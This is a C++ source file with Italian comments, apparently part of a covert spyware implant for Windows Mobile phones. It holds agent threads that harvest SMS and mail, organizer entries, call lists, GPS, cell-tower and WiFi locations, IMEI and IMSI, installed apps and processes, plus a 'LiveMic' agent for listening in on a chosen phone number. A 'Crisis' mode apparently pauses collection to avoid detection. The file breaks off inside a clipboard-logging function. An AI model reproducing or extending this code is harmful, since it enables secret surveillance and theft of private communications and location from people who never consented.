#include "Agents.h"
#include "Status.h"
#include "Conf.h"
#include "Common.h"
#include "Device.h"
#include "MAPIAgent.h"
#include "CallList.h"
#include "PoomMan.h"
#include "Snapshot.h"
#include "Camera.h"
#include "Url.h"
#include "LiveMic.h"
#include "WiFi.h"

#include <tapi.h>
#include <extapi.h>
#include <regext.h>
#include <snapi.h>
#include <pm.h>

DWORD WINAPI SmsAgent(LPVOID lpParam) {
	// Queste strutture dati vanno copiate e incollate in ogni agente
	AGENT_COMMON_DATA(AGENT_SMS);
	// Fine delle strutture obbligatorie
	DWORD cbConfig;
	PBYTE lpConfig = NULL;
	MAPIAgent* agent = MAPIAgent::Instance();
	Observer *observerObj = Observer::self();
	MSG Msg;

	if (lpParam == NULL || agent == NULL || statusObj == NULL || observerObj == NULL) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	// Inizializziamo i parametri (il primo e' la DWORD che indica la lunghezza
	// della configurazione, il secondo e' il puntatore al primo byte della conf)
	cbConfig = MyData->uParamLength;
	lpConfig = (BYTE *)(MyData->pParams);
	
	if (cbConfig == 0 || lpConfig == NULL) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}
	
	// Registriamoci all'observer
	if (observerObj->Register(GetCurrentThreadId()) == FALSE) {
		statusObj->ThreadAgentStopped(MyID);
		DBG_TRACE(L"Debug - Agents.cpp - SmsAgent [cannot register to Observer, exiting]\n", 5, FALSE);
		return TRUE;
	}

	// Comunichiamo al mondo che siamo vivi
	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - SmsAgent started\n", 5, FALSE);
	
	if (agent->Init(lpConfig, cbConfig) == FALSE) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}
	
	if (agent->Run(0) == FALSE) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}
	
	LOOP {
		// Diciamo semplicemente alla coda di farli passare tutti
		if (observerObj->GetMessage() != NULL) {
			observerObj->MarkMessage(GetCurrentThreadId(), IPC_PROCESS, FALSE);
		}

		if (PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE) != 0) {
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
		
		// Keep the sleeping time at 50, otherwise the MAIL agent WON'T WORK!!!
		if (AgentSleep(MyID, 50))
			break;
	}
	
	agent->Quit();
	agent->WaitForCollector();
	agent->Destroy();
	
	observerObj->UnRegister(GetCurrentThreadId());

	statusObj->ThreadAgentStopped(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - SmsAgent clean stop\n", 5, FALSE);
	return 0;
}

DWORD WINAPI OrganizerAgent(LPVOID lpParam) {
	// Queste strutture dati vanno copiate e incollate in ogni agente
	AGENT_COMMON_DATA(AGENT_ORGANIZER);
	// Fine delle strutture dati obbligatorie
	CPoomMan *poom = poom->self();

	if (lpParam == NULL || poom == NULL || statusObj == NULL) {
		DBG_TRACE(L"Debug - Agents.cpp - TaskAgent err 1 \n", 5, FALSE);
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	// Comunichiamo al mondo che siamo vivi
	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - TaskAgent started\n", 5, FALSE);
	
	if (poom->IsValid()) {
		poom->Run(MyData->uAgentId);
	} else {
		DBG_TRACE(L"Debug - Agents.cpp - TaskAgent err 2 \n", 5, FALSE);
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	LOOP {
	 	// E' leggero essendo solo una PeekMessage() per le notifiche
		poom->Notifications();
	
		if (AgentSleep(MyID, 5000)) {
			delete poom;

			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - TaskAgent clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadAgentStopped(MyID);
	return 0;
}

DWORD WINAPI CallListAgent(LPVOID lpParam) {
	AGENT_COMMON_DATA(AGENT_CALLLIST);
	CallList *call = new(std::nothrow) CallList();

	if (lpParam == NULL || call == NULL || statusObj == NULL) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - CallListAgent started\n", 5, FALSE);

	LOOP {
		call->Run(MyData->uAgentId);

		if (AgentSleep(MyID, 3 * 60 * 1000)) {
			delete call;

			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - CallListAgent clean stop\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadAgentStopped(MyID);
	return 0;
}

DWORD WINAPI PositionAgent(LPVOID lpParam) {
#define GPS_POLL_TIMEOUT 1000 * 60 * 14 // Tempo massimo di wait prima che il GPS venga spento
#define LOGGER_GPS  1
#define LOGGER_GSM 2
#define LOGGER_WIFI 4

	AGENT_COMMON_DATA(AGENT_POSITION);
	GPS *gpsObj = NULL;
	Cell *cellObj = NULL;
	Device *deviceObj = Device::self();
	CWifi wifi;
	DWORD dwMCC, dwMNC;
	wstring wifiAdapter;
	
	wifi.GetWiFiAdapterName(wifiAdapter);
	
	wstring wifiAdapterGuid = L"{98C5250D-C29A-4985-AE5F-AFE5367E5006}\\";
	wifiAdapterGuid += wifiAdapter;

	Log logGPS, logGSM, logWiFi;
	LocationAdditionalData locAdditional;

	UINT uInterval, uType, uLogger;
	SYSTEMTIME st;
	FILETIME ft;
	BOOL bGSMEmpty = TRUE, bGPSEmpty = TRUE, bWiFiEmpty = TRUE, bCrisis = FALSE;

	// GPS e' un log sequenziale
	typedef struct _GPSInfo {
		UINT uSize;
		UINT uVersion;
		FILETIME ft;
		GPS_POSITION gps;
		DWORD dwDelimiter;
	} GPSInfo;

	// GSM e' un log sequenziale
	typedef struct _GSMInfo {
		UINT uSize;
		UINT uVersion;
		FILETIME ft;
		RILCELLTOWERINFO cell;
		DWORD dwDelimiter;
	} GSMInfo;

	// WiFi e' un log unico per acquisizione
	typedef struct _WiFiInfo {
		UCHAR MacAddress[6];	// BSSID
		UINT uSsidLen;			// SSID length
		UCHAR Ssid[32];			// SSID
		INT iRssi;				// Received signal strength in dBm
	} WiFiInfo;

	GPSInfo gpsInfo;
	GSMInfo gsmlInfo;
	WiFiInfo wifiInfo;

	if (lpParam == NULL || deviceObj == NULL || MyData->uParamLength != sizeof(UINT) * 2 || statusObj == NULL) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	// Inizializziamo i parametri
	CopyMemory(&uInterval, MyData->pParams, sizeof(uInterval));
	CopyMemory(&uLogger, (BYTE *)(MyData->pParams) + sizeof(uInterval), sizeof(uLogger));

	if (uInterval < 1000)
		uInterval = 1000;

	if (uLogger == 0)
		uLogger = LOGGER_GSM;

	// E' singleton e non va distrutta (30 sec di timeout, 1 sec di max age)
	if ((uLogger & LOGGER_GPS) == LOGGER_GPS) {
		gpsObj = GPS::self(30000, 1000);

		if (gpsObj == NULL) {
			statusObj->ThreadAgentStopped(MyID);
			return TRUE;
		}

		// Se dobbiamo pollare a piccoli intervalli, accendiamo il GPS e teniamolo on
		if (uInterval < GPS_POLL_TIMEOUT) {
			if (gpsObj->Start() == FALSE && (uLogger & LOGGER_GSM) != LOGGER_GSM) {
				statusObj->ThreadAgentStopped(MyID);
				return TRUE;
			}
		}
	}

	if ((uLogger & LOGGER_GSM) == LOGGER_GSM) {
		cellObj = Cell::self(30000);

		if (cellObj == NULL) {
			statusObj->ThreadAgentStopped(MyID);
			return TRUE;
		}

		cellObj->Start();
		deviceObj->RefreshData();

		// Prendiamo il MCC ed il MNC
		dwMCC = deviceObj->GetMobileCountryCode();
		dwMNC = deviceObj->GetMobileNetworkCode();
	}
	
	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - PositionAgent started\n", 5, FALSE);

	// Creiamo i log per ogni tipo attivato
	if ((uLogger & LOGGER_GSM) == LOGGER_GSM) {
		locAdditional.uVersion = LOG_LOCATION_VERSION;
		locAdditional.uType = LOGTYPE_LOCATION_GSM;
		locAdditional.uStructNum = 0;

		if (logGSM.CreateLog(LOGTYPE_LOCATION_NEW, (BYTE *)&locAdditional, sizeof(LocationAdditionalData), FLASH) == FALSE) {
			if ((uLogger & LOGGER_GPS) == LOGGER_GPS)
				gpsObj->Stop();

			if ((uLogger & LOGGER_GSM) == LOGGER_GSM)
				cellObj->Stop();

			statusObj->ThreadAgentStopped(MyID);
			return TRUE;
		}
	}

	if ((uLogger & LOGGER_GPS) == LOGGER_GPS) {
		locAdditional.uVersion = LOG_LOCATION_VERSION;
		locAdditional.uType = LOGTYPE_LOCATION_GPS;
		locAdditional.uStructNum = 0;

		if (logGPS.CreateLog(LOGTYPE_LOCATION_NEW, (BYTE *)&locAdditional, sizeof(LocationAdditionalData), FLASH) == FALSE) {
			if ((uLogger & LOGGER_GPS) == LOGGER_GPS)
				gpsObj->Stop();

			if ((uLogger & LOGGER_GSM) == LOGGER_GSM)
				cellObj->Stop();

			logGSM.CloseLog(TRUE);

			statusObj->ThreadAgentStopped(MyID);
			return TRUE;
		}
	}

	/**
	 * LOG FORMAT
	 *
	 * DWORD|STRUCT
	 *
	 * DWORD indica il tipo di struttura che segue, STRUCT e' la struttura (GPS o CELL)
	 */
	LOOP {
		// Se c'e' il Crisis spegniamo il GPS
		while (bCrisis) {
			DBG_TRACE(L"Debug - Agents.cpp - PositionAgent is in crisis\n", 6, FALSE);

			if ((uLogger & LOGGER_GPS) == LOGGER_GPS && gpsObj->GpsReady())
				gpsObj->Stop();

			// Vediamo se dobbiamo fermarci
			if (AgentSleep(MyID, 20 * 1000)) {
				if ((uLogger & LOGGER_GSM) == LOGGER_GSM && cellObj->RadioReady())
					cellObj->Stop();

				logGSM.CloseLog(bGSMEmpty);
				logGPS.CloseLog(bGPSEmpty);
				logWiFi.CloseLog(bWiFiEmpty);

				statusObj->ThreadAgentStopped(MyID);
				DBG_TRACE(L"Debug - Agents.cpp - PositionAgent clean stop while in crisis [0]\n", 5, FALSE);
				return TRUE;
			}

			// Attendiamo che la crisi finisca
			if ((statusObj->Crisis() & CRISIS_POSITION) != CRISIS_POSITION) {
				bCrisis = FALSE;

				if ((uLogger & LOGGER_GPS) == LOGGER_GPS && gpsObj->GpsReady() == FALSE)
					gpsObj->Start();

				DBG_TRACE(L"Debug - Agents.cpp - PositionAgent leaving crisis\n", 6, FALSE);
			}
		}

		if ((uLogger & LOGGER_GPS) == LOGGER_GPS) {
			// Accendiamo il GPS se polliamo su lunghi intervalli
			if (uInterval > GPS_POLL_TIMEOUT) {
				DWORD now = GetTickCount();

				gpsObj->Start();

				// Polla al massimo per GPS_POLL_TIMEOUT ms
				do {
					// Attendiamo che fixi
					if (gpsObj->getGPS(&gpsInfo.gps)) {
						DWORD dwFields = GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;

						// Logga la coordinata solo se abbiamo latitutine/longitudine valida e fix 3D
						if ((gpsInfo.gps.dwValidFields & dwFields) == dwFields && gpsInfo.gps.FixType == GPS_FIX_3D)
							break;
					}

					if (AgentSleep(MyID, 60 * 1000)) {
						if ((uLogger & LOGGER_GPS) == LOGGER_GPS && gpsObj->GpsReady())
							gpsObj->Stop();

						if ((uLogger & LOGGER_GSM) == LOGGER_GSM && cellObj->RadioReady())
							cellObj->Stop();

						logGSM.CloseLog(bGSMEmpty);
						logGPS.CloseLog(bGPSEmpty);
						logWiFi.CloseLog(bWiFiEmpty);
						
						statusObj->ThreadAgentStopped(MyID);
						DBG_TRACE(L"Debug - Agents.cpp - PositionAgent clean stop [1]\n", 5, FALSE);
						return TRUE;
					}

					// Controlliamo se c'e' Crisis
					if ((statusObj->Crisis() & CRISIS_POSITION) == CRISIS_POSITION) {
						bCrisis = TRUE;
						break;
					}
				// Se non abbiamo superato il tempo di timeout proseguiamo col loop
				} while(GetTickCount() - now < GPS_POLL_TIMEOUT);
			}

			// Controlliamo se c'e' Crisis
			if ((statusObj->Crisis() & CRISIS_POSITION) == CRISIS_POSITION) {
				bCrisis = TRUE;
				continue;
			}

			if (gpsObj->getGPS(&gpsInfo.gps)) {
				uType = TYPE_GPS;

				gpsInfo.uSize = sizeof(gpsInfo);
				gpsInfo.uVersion = GPS_VERSION;

				// Scriviamo il tipo di struttura e poi i dati
				DWORD dwFields = GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;

				// Logga la coordinata solo se abbiamo latitutine/longitudine valida e fix 3D
				if ((gpsInfo.gps.dwValidFields & dwFields) == dwFields && gpsInfo.gps.FixType == GPS_FIX_3D) {
					if (logGPS.WriteLog((BYTE *)&uType, sizeof(uType))) {
						GetSystemTime(&st);
						SystemTimeToFileTime(&st, &ft);

						gpsInfo.ft.dwHighDateTime = ft.dwHighDateTime;
						gpsInfo.ft.dwLowDateTime = ft.dwLowDateTime;
						gpsInfo.dwDelimiter = LOG_DELIMITER;

						if (logGPS.WriteLog((BYTE *)&gpsInfo, sizeof(gpsInfo)))
							bGPSEmpty = FALSE;
					}
				}
			}

			// Stoppiamo il GPS se polliamo su lunghi intervalli
			if (uInterval > GPS_POLL_TIMEOUT)
				gpsObj->Stop();
		}

		// Senza questo Sleep() non entra nella if() successiva...
		Sleep(500);

		if ((uLogger & LOGGER_GSM) == LOGGER_GSM) {
			if (cellObj->getCELL(&gsmlInfo.cell)) {
				uType = TYPE_CELL;

				gsmlInfo.uSize = sizeof(gsmlInfo);
				gsmlInfo.uVersion = CELL_VERSION;

				// Scriviamo il tipo di struttura e poi i dati
				DWORD dwFields =  RIL_PARAM_CTI_LOCATIONAREACODE | RIL_PARAM_CTI_CELLID;

				if ((gsmlInfo.cell.dwParams & RIL_PARAM_CTI_RXLEVEL) == RIL_PARAM_CTI_RXLEVEL) {
					// Convertiamo da 0..63 a dBm
					gsmlInfo.cell.dwRxLevel -= 110;
				}

				if ((gsmlInfo.cell.dwParams & dwFields) == dwFields && 
					!(gsmlInfo.cell.dwLocationAreaCode == 0 && gsmlInfo.cell.dwCellID == 0)) {

					// Se non abbiamo MCC e MNC, usiamo quelli che abbiamo derivato dall'IMSI
					// Sui network CDMA: CID -> BID, LAC -> NID, MNC -> SID, MCC -> MCC
					if (gsmlInfo.cell.dwMobileCountryCode == 0)
						gsmlInfo.cell.dwMobileCountryCode = dwMCC;

					if (gsmlInfo.cell.dwMobileNetworkCode == 0)
						gsmlInfo.cell.dwMobileNetworkCode = dwMNC;

					if (logGSM.WriteLog((BYTE *)&uType, sizeof(uType))) {
						GetSystemTime(&st);
						SystemTimeToFileTime(&st, &ft);

						gsmlInfo.ft.dwHighDateTime = ft.dwHighDateTime;
						gsmlInfo.ft.dwLowDateTime = ft.dwLowDateTime;
						gsmlInfo.dwDelimiter = LOG_DELIMITER;

						if (logGSM.WriteLog((BYTE *)&gsmlInfo, sizeof(gsmlInfo)))
							bGSMEmpty = FALSE;
					}
				} 
			} 
		}

		Sleep(500);

		// Acquisiamo le reti WiFi
		if ((uLogger & LOGGER_WIFI) == LOGGER_WIFI) {
			struct BSSIDInfo bssid_list[20];
			DWORD dwReturned = 0;
			CEDEVICE_POWER_STATE powerState;

			ZeroMemory(&bssid_list, sizeof(bssid_list));

			if (wifiAdapter.empty() == false) {
				powerState = deviceObj->GetDevicePowerState(wifiAdapterGuid);

				if (powerState < D2) {
					wifi.RefreshBSSIDs(wifiAdapter);
					wifi.GetBSSIDs(wifiAdapter, (BSSIDInfo *)&bssid_list, sizeof(bssid_list), dwReturned);

					if (dwReturned) {
						bWiFiEmpty = TRUE;

						locAdditional.uVersion = LOG_LOCATION_VERSION;
						locAdditional.uType = LOGTYPE_LOCATION_WIFI;
						locAdditional.uStructNum = dwReturned;

						if (logWiFi.CreateLog(LOGTYPE_LOCATION_NEW, (BYTE *)&locAdditional, sizeof(LocationAdditionalData), FLASH) == TRUE) {
							for (UINT i = 0; i < dwReturned; i++) {
								if (bssid_list[i].SSID[0]) {
									CopyMemory(&wifiInfo.MacAddress, bssid_list[i].BSSID, 6);
									wifiInfo.uSsidLen = wcslen(bssid_list[i].SSID);
									sprintf((CHAR *)wifiInfo.Ssid, "%S", bssid_list[i].SSID);
									wifiInfo.iRssi = bssid_list[i].RSSI;

									if (logWiFi.WriteLog((PBYTE)&wifiInfo, sizeof(wifiInfo)) == TRUE && dwReturned)
										bWiFiEmpty = FALSE;
								}
							}

							logWiFi.CloseLog(bWiFiEmpty);
						}
					}
				}
			}
		}

		if (AgentSleep(MyID, uInterval)) {
			if ((uLogger & LOGGER_GPS) == LOGGER_GPS && uInterval < GPS_POLL_TIMEOUT)
				gpsObj->Stop();

			if ((uLogger & LOGGER_GSM) == LOGGER_GSM)
				cellObj->Stop();

			logGSM.CloseLog(bGSMEmpty);
			logGPS.CloseLog(bGPSEmpty);
			logWiFi.CloseLog(bWiFiEmpty);
			
			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - PositionAgent clean stop [2]\n", 5, FALSE);
			return TRUE;
		}
	}

	statusObj->ThreadAgentStopped(MyID);
	return 0;
}

DWORD WINAPI LiveMicAgent(LPVOID lpParam) {
	AGENT_COMMON_DATA(AGENT_LIVEMIC);
	Log log;
	Device *deviceObj = Device::self();
	UINT uNumLen = 0;
	wstring strNum;

	if (lpParam == NULL || deviceObj == NULL || MyData->uParamLength <= sizeof(UINT) || statusObj == NULL) {
		DBG_TRACE(L"Debug - Agent.cpp - LiveMicAgent Failed 1\n", 5, FALSE);
		statusObj->ThreadAgentStopped(MyID);
		return 0;
	}

	// Inizializziamo i parametri
	CopyMemory(&uNumLen, MyData->pParams, sizeof(UINT));
	strNum = (PWCHAR)((PBYTE)(MyData->pParams) + sizeof(uNumLen));
	DBG_TRACE_INT(L"Agents.cpp LiveMicAgent param length:", 5, FALSE, uNumLen);
	DBG_TRACE((PWCHAR)strNum.c_str(),5,FALSE);

	if (strNum.empty()) {
		DBG_TRACE(L"Debug - Agent.cpp - LiveMicAgent Failed 2\n", 5, FALSE);
		return 0;
	}

	LiveMic *pMic = NULL;
	pMic = pMic->self();

	if (!pMic) {
		DBG_TRACE(L"Debug - Agent.cpp - LiveMicAgent Failed 3\n", 5, FALSE);
		return 0;
	}
	
	DBG_TRACE(L"Debug - Agent.cpp - LiveMicAgent started\n", 5, FALSE);

	// Set phone number to spy on
	if (!pMic->Initialize(strNum, g_hInstance)) {
		DBG_TRACE(L"Debug - Agent.cpp - LiveMicAgent Failed 4\n", 5, FALSE);
		return 0;
	}

	statusObj->AgentAlive(MyID);

	DBG_TRACE(L"Debug - Agent.cpp - LiveMicAgent Initialized\n", 5, FALSE);

	// Il DeviceAgent resta in run in modo da venir riavviato alla successiva sync
	LOOP {
		if (AgentSleep(MyID, 10000)) {
					
			pMic->Uninitialize();
			DBG_TRACE(L"Debug - Agent.cpp - LiveMicAgent clean stop\n", 5, FALSE);

			statusObj->ThreadAgentStopped(MyID);

			return 0;
		}
	}

	return 0;
}									

DWORD WINAPI DeviceInfoAgent(LPVOID lpParam) {
	AGENT_COMMON_DATA(AGENT_DEVICE);
	Log log;
	Device *deviceObj = Device::self();
	WCHAR wLine[MAX_PATH + 1];
	ULARGE_INTEGER lFreeToCaller, lDiskSpace, lDiskFree;
	OSVERSIONINFO os;
	SYSTEM_INFO si;
	MEMORYSTATUS ms;
	UINT uDisks, i, uProcessList;

	if (lpParam == NULL || deviceObj == NULL || MyData->uParamLength != sizeof(UINT) || statusObj == NULL) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	// Inizializziamo i parametri
	CopyMemory(&uProcessList, MyData->pParams, sizeof(uProcessList));
	
	statusObj->AgentAlive(MyID);
	DBG_TRACE(L"Debug - Agents.cpp - DeviceInfoAgent started\n", 5, FALSE);

	deviceObj->RefreshData();

	if (log.CreateLog(LOGTYPE_DEVICE, NULL, 0, FLASH) == FALSE) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	// XXX allocare spazio come si deve se decidiamo di tenere questo agente
	ZeroMemory(wLine, sizeof(wLine));
	ZeroMemory(&si, sizeof(si));

	deviceObj->GetSystemInfo(&si);

	wsprintf(wLine, L"Processor: %d x ", si.dwNumberOfProcessors);
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	switch (si.wProcessorArchitecture) {
		case PROCESSOR_ARCHITECTURE_INTEL:
			wsprintf(wLine, L"Intel ");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));

			switch(si.wProcessorLevel) {
				case 4:
					wsprintf(wLine, L"80486");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				case 5:
					wsprintf(wLine, L"Pentium");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				default:
					break;
			}

			break;

		case PROCESSOR_ARCHITECTURE_MIPS:
			wsprintf(wLine, L"Mips ");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));

			switch(si.wProcessorLevel) {
				case 3:
					wsprintf(wLine, L"R3000");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				case 4:
					wsprintf(wLine, L"R4000");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				case 5:
					wsprintf(wLine, L"R5000");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				default:
					break;
			}

			break;

		case PROCESSOR_ARCHITECTURE_SHX:
			switch(si.wProcessorLevel) {
				case 3:
					wsprintf(wLine, L"Sh3");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				case 4:
					wsprintf(wLine, L"Sh4");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				default:
					wsprintf(wLine, L"Shx");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;
			}

			break;

		case PROCESSOR_ARCHITECTURE_ARM:
			wsprintf(wLine, L"Arm ");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));

			switch(si.wProcessorLevel) {
				case 4:
					wsprintf(wLine, L"4");
					log.WriteLog((BYTE *)&wLine, WideLen(wLine));
					break;

				default:
					break;
			}

			break;

		case PROCESSOR_ARCHITECTURE_UNKNOWN:
		default: 
			wsprintf(wLine, L"Unknown");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			break;
	}

	wsprintf(wLine, L" (page %d bytes)\n", si.dwPageSize);
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	// Info sulla batteria
	const SYSTEM_POWER_STATUS_EX2 *pBattery = deviceObj->GetBatteryStatus();

	if (pBattery) {
		wsprintf(wLine, L"Battery: %d%%", pBattery->BatteryLifePercent);
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));

		if (pBattery->ACLineStatus == AC_LINE_ONLINE) {
			wsprintf(wLine, L" (on AC line)", pBattery->ACLineStatus);
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
		}

		wsprintf(wLine, L"\n");
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));
	}

	// Info sulla RAM
	ZeroMemory(&ms, sizeof(ms));
	deviceObj->GetMemoryInfo(&ms);

	if (ms.dwTotalPhys && ms.dwAvailPhys) {
		wsprintf(wLine, L"Memory: %dMB free / %dMB total (%d%% used)\n", ms.dwAvailPhys / 1000000, ms.dwTotalPhys / 1000000, ms.dwMemoryLoad);
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));
	}

	// Prendiamo le informazioni sui dischi
	uDisks = deviceObj->GetDiskNumber();
	wstring strDiskName;

	for (i = 0; i < uDisks; i++) {
		if (deviceObj->GetDiskInfo(i, strDiskName, &lFreeToCaller, &lDiskSpace, &lDiskFree)) {
			if (strDiskName.size()) {
				wsprintf(wLine, L"Disk: \"%s\"", strDiskName.c_str());
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			}

			if (lDiskSpace.QuadPart && lDiskFree.QuadPart) {
				UINT uFree, uTotal;
				uFree = (UINT)(lDiskFree.QuadPart / 1000000);
				uTotal = (UINT)(lDiskSpace.QuadPart / 1000000);
				wsprintf(wLine, L" - %uMB free / %uMB total\n", uFree, uTotal);
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			} else {
				wsprintf(wLine, L"\n");
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			}
		}	
	}

	wsprintf(wLine, L"\n");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	ZeroMemory(&os, sizeof(os));

	if (deviceObj->GetOsVersion(&os)) {
		wsprintf(wLine, L"OS Version: Windows CE %d.%d (build %d) Platform ID %d", os.dwMajorVersion, os.dwMinorVersion, os.dwBuildNumber, os.dwPlatformId);
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));

		if (os.szCSDVersion && wcslen(os.szCSDVersion)) {
			wsprintf(wLine, L" (\"%s\")\n", os.szCSDVersion);
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
		} else {
			wsprintf(wLine, L"\n");
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
		}
	}

	wsprintf(wLine, L"\n");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	wsprintf(wLine, L"Device: %s (%s)\n", deviceObj->GetModel().size() ? deviceObj->GetModel().c_str() : L"Unknown",
		deviceObj->GetManufacturer().size() ? deviceObj->GetManufacturer().c_str() : L"Unknown");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	wsprintf(wLine, L"IMEI: %s\n", deviceObj->GetImei().size() ? deviceObj->GetImei().c_str() : L"Unknown");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	wsprintf(wLine, L"IMSI: %s\n", deviceObj->GetImsi().size() ? deviceObj->GetImsi().c_str() : L"Unknown");
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	// Leggiamo l'operatore
	WCHAR wCarrier[50];

	if (RegistryGetString(SN_PHONEOPERATORNAME_ROOT, SN_PHONEOPERATORNAME_PATH, SN_PHONEOPERATORNAME_VALUE,
		wCarrier, sizeof(wCarrier)) == S_OK && wcslen(wCarrier)) {

		wsprintf(wLine, L"Carrier: %s\n", wCarrier);
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));
	}

	DWORD dwUptime = GetTickCount();
	DWORD dwDays, dwHours, dwMinutes;

	dwDays = dwUptime / (24 * 60 * 60 * 1000);
	dwUptime %= (24 * 60 * 60 * 1000);
	
	dwHours = dwUptime / (60 * 60 * 1000);
	dwUptime %= (60 * 60 * 1000);
	
	dwMinutes = dwUptime / (60 * 1000);
	dwUptime %= (60 * 1000);

	wsprintf(wLine, L"Uptime: %d days %d hours %d minutes\n\n", dwDays, dwHours, dwMinutes);
	log.WriteLog((BYTE *)&wLine, WideLen(wLine));

	// Leggiamo la lista dei programmi installati
	do {
		HKEY hApps;
		LONG lRet;
		UINT i;
		WCHAR wKeyName[256] = {0};
		DWORD dwKeySize = sizeof(wKeyName) / sizeof(WCHAR);

		if (uProcessList == 0)
			break;

		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Apps", 0, 0, &hApps) != ERROR_SUCCESS)
			break;

		wsprintf(wLine, L"Application List:\n");
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));

		for (i = 0; ; i++) {
			lRet = RegEnumKeyEx(hApps, i, wKeyName, &dwKeySize, NULL, NULL, NULL, NULL);

			if (lRet == ERROR_MORE_DATA) {
				continue;
			}

			if (lRet != ERROR_SUCCESS) {
				RegCloseKey(hApps);
				break;
			}

			wsprintf(wLine, L"%s\n", wKeyName);
			log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			dwKeySize = sizeof(wKeyName) / sizeof(WCHAR);
		}
	} while(0);

	// Prendiamo la lista dei processi
	do {
		if (uProcessList == 0)
			break;

		wsprintf(wLine, L"\nProcess List\n", dwDays, dwHours, dwMinutes);
		log.WriteLog((BYTE *)&wLine, WideLen(wLine));

		// Il secondo flag e' un undocumented che serve a NON richiedere la lista
		// degli heaps altrimenti la funzione fallisce sempre per mancanza di RAM.
		PROCESSENTRY32 pe;
		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPNOHEAPS, 0);

		if (hSnap == INVALID_HANDLE_VALUE)
			break;

		pe.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hSnap, &pe)) {
			do {
				wsprintf(wLine, L"PID: 0x%08x - ", pe.th32ProcessID);
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));

				wsprintf(wLine, L"%s", pe.szExeFile);
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));

				wsprintf(wLine, L"\n");
				log.WriteLog((BYTE *)&wLine, WideLen(wLine));
			} while (Process32Next(hSnap, &pe));
		}

		CloseToolhelp32Snapshot(hSnap);
	} while(0);

	WCHAR wNull = 0;
	log.WriteLog((BYTE *)&wNull, sizeof(WCHAR));
	log.CloseLog();
	
	// Il DeviceAgent resta in run in modo da venir riavviato alla successiva sync
	LOOP {
		if (AgentSleep(MyID, 10 * 1000)) {
			statusObj->ThreadAgentStopped(MyID);
			DBG_TRACE(L"Debug - Agents.cpp - DeviceInfoAgent clean stop\n", 5, FALSE);
			return TRUE;
		}
	}
}

DWORD WINAPI ClipboardAgent(LPVOID lpParam) {
	AGENT_COMMON_DATA(AGENT_CLIPBOARD);
	BOOL bEmpty = TRUE;
	INT iCount;
	UINT uFormat, uMarkupLen, uHash = 0, uNewHash;
	HANDLE hData;
	HWND hWindow;
	BYTE *pBuffer, *pMarkup;
	wstring strText, strOld;
	WCHAR wTitle[MAX_TITLE_LEN];
	Log log;

	if (lpParam == NULL || statusObj == NULL) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

	statusObj->AgentAlive(MyID);

	if (log.CreateLog(LOGTYPE_CLIPBOARD, NULL, 0, FLASH) == FALSE) {
		statusObj->ThreadAgentStopped(MyID);
		return TRUE;
	}

